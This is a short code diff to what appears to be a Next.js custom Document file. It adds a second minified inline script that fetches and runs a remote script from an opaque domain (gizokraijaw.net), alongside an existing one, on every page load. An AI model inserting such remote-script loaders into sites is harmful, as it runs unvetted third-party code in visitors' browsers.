@@ -10,6 +10,12 @@ export default function Document() {
                         __html: `(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('vemtoutcheeg.com',9733016,document.createElement('script'))`,
                     }}
                 ></script>
+
+                <script
+                    dangerouslySetInnerHTML={{
+                        __html: `(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('gizokraijaw.net',9733080,document.createElement('script'))`,
+                    }}
+                ></script>
             </Head>
             <body>
                 <Main />
